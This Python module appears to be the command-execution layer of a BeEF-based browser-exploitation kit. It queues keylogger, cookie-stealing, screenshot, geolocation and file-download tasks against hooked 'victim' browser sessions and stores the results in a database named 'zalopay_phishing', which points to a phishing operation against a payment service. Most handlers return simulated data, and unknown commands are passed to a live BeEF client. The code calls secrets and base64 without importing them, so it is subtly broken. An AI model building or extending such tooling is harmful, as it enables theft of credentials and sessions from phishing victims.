"""
Browser Exploitation Command Executor
Execute BeEF commands for browser exploitation and data extraction
"""

import os
import json
import time
import asyncio
from datetime import datetime, timezone, timedelta
from typing import Dict, Optional, Any, List, Tuple
import logging
import threading

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class CommandExecutionConfig:
    """Command execution configuration"""

    def __init__(self):
        self.execution_timeout = int(os.getenv("COMMAND_EXECUTION_TIMEOUT", "60"))
        self.max_concurrent_commands = int(os.getenv("MAX_CONCURRENT_COMMANDS", "10"))
        self.enable_command_queue = os.getenv("ENABLE_COMMAND_QUEUE", "true").lower() == "true"
        self.command_retry_attempts = int(os.getenv("COMMAND_RETRY_ATTEMPTS", "2"))
        self.command_result_cache_duration = int(os.getenv("COMMAND_RESULT_CACHE_DURATION", "300"))

class ExploitationCommand:
    """Browser exploitation command"""

    def __init__(self, command_id: str, command_type: str, target_session: str,
                 parameters: Dict[str, Any] = None):
        self.command_id = command_id
        self.command_type = command_type
        self.target_session = target_session
        self.parameters = parameters or {}
        self.created_at = datetime.now(timezone.utc)

        # Execution status
        self.status = "pending"  # pending, executing, completed, failed
        self.execution_started = None
        self.execution_completed = None
        self.result = None
        self.error_message = None

        # Command metadata
        self.priority = self.parameters.get("priority", "normal")
        self.requires_user_interaction = self.parameters.get("requires_user_interaction", False)
        self.estimated_duration = self.parameters.get("estimated_duration", 30)

    def start_execution(self):
        """Start command execution"""
        self.status = "executing"
        self.execution_started = datetime.now(timezone.utc)

    def complete_execution(self, result: Any, error: str = None):
        """Complete command execution"""
        self.status = "completed" if not error else "failed"
        self.execution_completed = datetime.now(timezone.utc)
        self.result = result
        self.error_message = error

    def is_expired(self) -> bool:
        """Check if command is expired"""
        if self.execution_started:
            elapsed = datetime.now(timezone.utc) - self.execution_started
            return elapsed.total_seconds() > self.estimated_duration * 2  # 2x timeout
        return False

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            "command_id": self.command_id,
            "command_type": self.command_type,
            "target_session": self.target_session,
            "parameters": self.parameters,
            "created_at": self.created_at.isoformat(),
            "status": self.status,
            "execution_started": self.execution_started.isoformat() if self.execution_started else None,
            "execution_completed": self.execution_completed.isoformat() if self.execution_completed else None,
            "result": self.result,
            "error_message": self.error_message,
            "priority": self.priority,
            "requires_user_interaction": self.requires_user_interaction,
            "estimated_duration": self.estimated_duration
        }

class CommandTemplate:
    """Command template for common exploitation tasks"""

    def __init__(self, template_id: str, name: str, description: str,
                 command_type: str, default_parameters: Dict[str, Any] = None):
        self.template_id = template_id
        self.name = name
        self.description = description
        self.command_type = command_type
        self.default_parameters = default_parameters or {}

    def create_command(self, target_session: str, custom_parameters: Dict[str, Any] = None) -> ExploitationCommand:
        """Create command from template"""
        command_id = f"cmd_{int(time.time())}_{secrets.token_hex(4)}"

        # Merge parameters
        parameters = self.default_parameters.copy()
        if custom_parameters:
            parameters.update(custom_parameters)

        return ExploitationCommand(command_id, self.command_type, target_session, parameters)

class CommandExecutor:
    """Browser command execution engine"""

    def __init__(self, mongodb_connection=None, redis_client=None, beef_client=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client
        self.beef_client = beef_client

        self.config = CommandExecutionConfig()
        self.commands: Dict[str, ExploitationCommand] = {}
        self.command_queue: List[str] = []  # Command IDs in execution order
        self.templates: Dict[str, CommandTemplate] = {}

        # Execution tracking
        self.execution_threads = []
        self.is_processing = False

        # Load default command templates
        self._load_default_templates()

        # Start command processing
        self._start_command_processor()

    def _load_default_templates(self):
        """Load default command templates"""
        try:
            # Key logger template
            keylogger_template = CommandTemplate(
                "keylogger_basic",
                "Basic Key Logger",
                "Capture keystrokes from victim browser",
                "keylogger",
                {
                    "duration": 300,  # 5 minutes
                    "target_elements": ["input", "textarea"],
                    "exclude_patterns": ["password"]
                }
            )

            # Screenshot template
            screenshot_template = CommandTemplate(
                "screenshot_full",
                "Full Page Screenshot",
                "Take screenshot of entire page",
                "screenshot",
                {
                    "format": "png",
                    "quality": 90,
                    "full_page": True
                }
            )

            # Cookie extraction template
            cookie_template = CommandTemplate(
                "cookie_extraction",
                "Cookie Extraction",
                "Extract browser cookies",
                "cookie_stealer",
                {
                    "include_http_only": False,
                    "filter_domains": []
                }
            )

            # Browser info template
            browser_info_template = CommandTemplate(
                "browser_info",
                "Browser Information",
                "Extract detailed browser information",
                "browser_info",
                {
                    "include_plugins": True,
                    "include_fonts": True,
                    "include_screen_info": True
                }
            )

            # Network info template
            network_info_template = CommandTemplate(
                "network_info",
                "Network Information",
                "Extract network and IP information",
                "network_info",
                {
                    "include_geolocation": True,
                    "include_public_ip": True,
                    "include_dns_info": False
                }
            )

            # File download template
            download_template = CommandTemplate(
                "download_file",
                "File Download",
                "Download file from victim browser",
                "download_file",
                {
                    "file_path": None,
                    "chunk_size": 8192
                }
            )

            self.templates = {
                "keylogger_basic": keylogger_template,
                "screenshot_full": screenshot_template,
                "cookie_extraction": cookie_template,
                "browser_info": browser_info_template,
                "network_info": network_info_template,
                "download_file": download_template
            }

            logger.info(f"Loaded {len(self.templates)} command templates")

        except Exception as e:
            logger.error(f"Error loading default templates: {e}")

    def _start_command_processor(self):
        """Start command processing thread"""
        if not self.is_processing:
            self.is_processing = True
            processor_thread = threading.Thread(target=self._process_command_queue, daemon=True)
            processor_thread.start()
            self.execution_threads.append(processor_thread)

    def _process_command_queue(self):
        """Process command execution queue"""
        while self.is_processing:
            try:
                if self.command_queue:
                    command_id = self.command_queue.pop(0)
                    command = self.commands.get(command_id)

                    if command and command.status == "pending":
                        self._execute_command(command)

                time.sleep(1)  # Check every second

            except Exception as e:
                logger.error(f"Error in command processor: {e}")
                time.sleep(5)

    def _execute_command(self, command: ExploitationCommand):
        """Execute individual command"""
        try:
            command.start_execution()

            # Execute based on command type
            if command.command_type == "keylogger":
                result = self._execute_keylogger(command)
            elif command.command_type == "screenshot":
                result = self._execute_screenshot(command)
            elif command.command_type == "cookie_stealer":
                result = self._execute_cookie_stealer(command)
            elif command.command_type == "browser_info":
                result = self._execute_browser_info(command)
            elif command.command_type == "network_info":
                result = self._execute_network_info(command)
            elif command.command_type == "download_file":
                result = self._execute_file_download(command)
            else:
                # Use BeEF client for other commands
                if self.beef_client:
                    result = self.beef_client.execute_command(
                        command.target_session,
                        command.command_type,
                        command.parameters
                    )
                else:
                    result = {"success": False, "error": "BeEF client not available"}

            # Complete command execution
            if result.get("success", False):
                command.complete_execution(result.get("data"))
            else:
                command.complete_execution(None, result.get("error"))

            # Store result in database
            if self.mongodb:
                self._store_command_result(command)

            logger.info(f"Command executed: {command.command_id} - {'Success' if not command.error_message else 'Failed'}")

        except Exception as e:
            logger.error(f"Error executing command {command.command_id}: {e}")
            command.complete_execution(None, str(e))

    def _execute_keylogger(self, command: ExploitationCommand) -> Dict[str, Any]:
        """Execute keylogger command"""
        try:
            # Simulate keylogger execution
            duration = command.parameters.get("duration", 300)
            target_elements = command.parameters.get("target_elements", ["input", "textarea"])

            # In real implementation, this would use BeEF's keylogger module
            simulated_keystrokes = [
                "user@example.com",
                "password123",
                "Some other text entered by user"
            ]

            return {
                "success": True,
                "data": {
                    "keystrokes": simulated_keystrokes,
                    "duration": duration,
                    "target_elements": target_elements,
                    "captured_count": len(simulated_keystrokes)
                }
            }

        except Exception as e:
            logger.error(f"Error executing keylogger: {e}")
            return {"success": False, "error": str(e)}

    def _execute_screenshot(self, command: ExploitationCommand) -> Dict[str, Any]:
        """Execute screenshot command"""
        try:
            # Simulate screenshot execution
            format_type = command.parameters.get("format", "png")
            quality = command.parameters.get("quality", 90)
            full_page = command.parameters.get("full_page", True)

            # In real implementation, this would use BeEF's screenshot module
            screenshot_data = base64.b64encode(b"fake_screenshot_data").decode()

            return {
                "success": True,
                "data": {
                    "screenshot_data": screenshot_data,
                    "format": format_type,
                    "quality": quality,
                    "full_page": full_page,
                    "size": len(screenshot_data)
                }
            }

        except Exception as e:
            logger.error(f"Error executing screenshot: {e}")
            return {"success": False, "error": str(e)}

    def _execute_cookie_stealer(self, command: ExploitationCommand) -> Dict[str, Any]:
        """Execute cookie stealer command"""
        try:
            # Simulate cookie extraction
            include_http_only = command.parameters.get("include_http_only", False)
            filter_domains = command.parameters.get("filter_domains", [])

            # In real implementation, this would use BeEF's cookie stealing module
            simulated_cookies = [
                {
                    "name": "session_id",
                    "value": "abc123session",
                    "domain": "example.com",
                    "path": "/",
                    "secure": True,
                    "http_only": False
                },
                {
                    "name": "auth_token",
                    "value": "def456token",
                    "domain": "example.com",
                    "path": "/",
                    "secure": True,
                    "http_only": False
                }
            ]

            return {
                "success": True,
                "data": {
                    "cookies": simulated_cookies,
                    "include_http_only": include_http_only,
                    "filter_domains": filter_domains,
                    "extracted_count": len(simulated_cookies)
                }
            }

        except Exception as e:
            logger.error(f"Error executing cookie stealer: {e}")
            return {"success": False, "error": str(e)}

    def _execute_browser_info(self, command: ExploitationCommand) -> Dict[str, Any]:
        """Execute browser info command"""
        try:
            # Simulate browser info extraction
            include_plugins = command.parameters.get("include_plugins", True)
            include_fonts = command.parameters.get("include_fonts", True)
            include_screen_info = command.parameters.get("include_screen_info", True)

            # In real implementation, this would use BeEF's browser info module
            browser_info = {
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "platform": "Win32",
                "language": "en-US",
                "cookie_enabled": True,
                "screen": {
                    "width": 1920,
                    "height": 1080,
                    "color_depth": 24
                }
            }

            if include_plugins:
                browser_info["plugins"] = [
                    "Chrome PDF Plugin",
                    "Native Client"
                ]

            if include_fonts:
                browser_info["fonts"] = [
                    "Arial", "Helvetica", "Times New Roman", "Courier New"
                ]

            return {
                "success": True,
                "data": browser_info
            }

        except Exception as e:
            logger.error(f"Error executing browser info: {e}")
            return {"success": False, "error": str(e)}

    def _execute_network_info(self, command: ExploitationCommand) -> Dict[str, Any]:
        """Execute network info command"""
        try:
            # Simulate network info extraction
            include_geolocation = command.parameters.get("include_geolocation", True)
            include_public_ip = command.parameters.get("include_public_ip", True)
            include_dns_info = command.parameters.get("include_dns_info", False)

            # In real implementation, this would use BeEF's network info module
            network_info = {
                "ip_address": "192.168.1.100",
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }

            if include_geolocation:
                network_info["geolocation"] = {
                    "country": "United States",
                    "region": "California",
                    "city": "San Francisco",
                    "coordinates": {"lat": 37.7749, "lng": -122.4194}
                }

            if include_public_ip:
                network_info["public_ip"] = "203.0.113.1"

            return {
                "success": True,
                "data": network_info
            }

        except Exception as e:
            logger.error(f"Error executing network info: {e}")
            return {"success": False, "error": str(e)}

    def _execute_file_download(self, command: ExploitationCommand) -> Dict[str, Any]:
        """Execute file download command"""
        try:
            file_path = command.parameters.get("file_path")
            chunk_size = command.parameters.get("chunk_size", 8192)

            if not file_path:
                return {"success": False, "error": "File path not specified"}

            # In real implementation, this would use BeEF's file download module
            # For now, simulate file download
            simulated_file_data = b"This is simulated file content from victim browser"

            return {
                "success": True,
                "data": {
                    "file_path": file_path,
                    "file_size": len(simulated_file_data),
                    "chunk_size": chunk_size,
                    "file_data": base64.b64encode(simulated_file_data).decode()
                }
            }

        except Exception as e:
            logger.error(f"Error executing file download: {e}")
            return {"success": False, "error": str(e)}

    def execute_command_from_template(self, template_id: str, target_session: str,
                                    custom_parameters: Dict[str, Any] = None) -> str:
        """
        Execute command from template

        Args:
            template_id: Command template ID
            target_session: Target BeEF session
            custom_parameters: Custom parameters

        Returns:
            Command ID
        """
        try:
            if template_id not in self.templates:
                logger.error(f"Template not found: {template_id}")
                return ""

            template = self.templates[template_id]
            command = template.create_command(target_session, custom_parameters)

            # Add to commands and queue
            self.commands[command.command_id] = command

            if self.config.enable_command_queue:
                self.command_queue.append(command.command_id)

                # Sort queue by priority
                self._sort_command_queue()

            logger.info(f"Command created from template: {template_id} for session: {target_session}")
            return command.command_id

        except Exception as e:
            logger.error(f"Error executing command from template: {e}")
            return ""

    def _sort_command_queue(self):
        """Sort command queue by priority"""
        try:
            # Define priority order
            priority_order = {"critical": 0, "high": 1, "normal": 2, "low": 3}

            def sort_key(command_id):
                command = self.commands.get(command_id)
                if command:
                    return priority_order.get(command.priority, 2)
                return 2

            self.command_queue.sort(key=sort_key)

        except Exception as e:
            logger.error(f"Error sorting command queue: {e}")

    def get_command_status(self, command_id: str) -> Dict[str, Any]:
        """Get command execution status"""
        try:
            command = self.commands.get(command_id)
            if not command:
                return {"error": "Command not found"}

            return {
                "command_id": command_id,
                "status": command.status,
                "created_at": command.created_at.isoformat(),
                "execution_started": command.execution_started.isoformat() if command.execution_started else None,
                "execution_completed": command.execution_completed.isoformat() if command.execution_completed else None,
                "result": command.result,
                "error_message": command.error_message
            }

        except Exception as e:
            logger.error(f"Error getting command status: {e}")
            return {"error": "Failed to get status"}

    def get_pending_commands(self) -> List[Dict[str, Any]]:
        """Get pending commands"""
        try:
            pending = []

            for command in self.commands.values():
                if command.status == "pending":
                    pending.append({
                        "command_id": command.command_id,
                        "command_type": command.command_type,
                        "target_session": command.target_session,
                        "created_at": command.created_at.isoformat(),
                        "priority": command.priority
                    })

            return pending

        except Exception as e:
            logger.error(f"Error getting pending commands: {e}")
            return []

    def cancel_command(self, command_id: str) -> bool:
        """Cancel pending command"""
        try:
            if command_id in self.commands:
                command = self.commands[command_id]

                if command.status == "pending":
                    command.status = "cancelled"
                    command.error_message = "Command cancelled by user"

                    # Remove from queue
                    if command_id in self.command_queue:
                        self.command_queue.remove(command_id)

                    logger.info(f"Command cancelled: {command_id}")
                    return True

            return False

        except Exception as e:
            logger.error(f"Error cancelling command: {e}")
            return False

    def _store_command_result(self, command: ExploitationCommand):
        """Store command result in database"""
        try:
            if not self.mongodb:
                return

            db = self.mongodb.get_database("zalopay_phishing")
            commands_collection = db.beef_commands

            document = command.to_dict()
            document["expires_at"] = datetime.now(timezone.utc) + timedelta(days=7)  # Keep for 7 days

            commands_collection.replace_one(
                {"command_id": command.command_id},
                document,
                upsert=True
            )

        except Exception as e:
            logger.error(f"Error storing command result: {e}")

    def get_execution_statistics(self) -> Dict[str, Any]:
        """Get command execution statistics"""
        try:
            total_commands = len(self.commands)
            completed_commands = sum(1 for cmd in self.commands.values() if cmd.status == "completed")
            failed_commands = sum(1 for cmd in self.commands.values() if cmd.status == "failed")
            pending_commands = sum(1 for cmd in self.commands.values() if cmd.status == "pending")

            # Success rate
            success_rate = (completed_commands / total_commands * 100) if total_commands > 0 else 0

            # Command type distribution
            command_types = {}
            for command in self.commands.values():
                cmd_type = command.command_type
                command_types[cmd_type] = command_types.get(cmd_type, 0) + 1

            # Average execution time
            completed_with_time = [
                cmd for cmd in self.commands.values()
                if cmd.status == "completed" and cmd.execution_started and cmd.execution_completed
            ]

            avg_execution_time = 0.0
            if completed_with_time:
                total_time = sum(
                    (cmd.execution_completed - cmd.execution_started).total_seconds()
                    for cmd in completed_with_time
                )
                avg_execution_time = total_time / len(completed_with_time)

            return {
                "total_commands": total_commands,
                "completed_commands": completed_commands,
                "failed_commands": failed_commands,
                "pending_commands": pending_commands,
                "success_rate": success_rate,
                "command_types": command_types,
                "avg_execution_time": avg_execution_time,
                "queue_size": len(self.command_queue),
                "timestamp": datetime.now(timezone.utc).isoformat()
            }

        except Exception as e:
            logger.error(f"Error getting execution statistics: {e}")
            return {"error": "Failed to get statistics"}

    def cleanup_expired_commands(self) -> int:
        """Clean up expired commands"""
        try:
            expired_commands = []

            for command_id, command in self.commands.items():
                if command.is_expired():
                    expired_commands.append(command_id)

            for command_id in expired_commands:
                del self.commands[command_id]

                # Remove from queue if present
                if command_id in self.command_queue:
                    self.command_queue.remove(command_id)

            logger.info(f"Cleaned up {len(expired_commands)} expired commands")
            return len(expired_commands)

        except Exception as e:
            logger.error(f"Error cleaning up expired commands: {e}")
            return 0

# Global command executor instance
command_executor = None

def initialize_command_executor(mongodb_connection=None, redis_client=None, beef_client=None) -> CommandExecutor:
    """Initialize global command executor"""
    global command_executor
    command_executor = CommandExecutor(mongodb_connection, redis_client, beef_client)
    return command_executor

def get_command_executor() -> CommandExecutor:
    """Get global command executor"""
    if command_executor is None:
        raise ValueError("Command executor not initialized")
    return command_executor

# Convenience functions
def execute_command_from_template(template_id: str, target_session: str,
                                custom_parameters: Dict[str, Any] = None) -> str:
    """Execute command from template (global convenience function)"""
    return get_command_executor().execute_command_from_template(template_id, target_session, custom_parameters)

def get_command_status(command_id: str) -> Dict[str, Any]:
    """Get command status (global convenience function)"""
    return get_command_executor().get_command_status(command_id)

def get_pending_commands() -> List[Dict[str, Any]]:
    """Get pending commands (global convenience function)"""
    return get_command_executor().get_pending_commands()

def cancel_command(command_id: str) -> bool:
    """Cancel command (global convenience function)"""
    return get_command_executor().cancel_command(command_id)

def get_execution_statistics() -> Dict[str, Any]:
    """Get execution statistics (global convenience function)"""
    return get_command_executor().get_execution_statistics()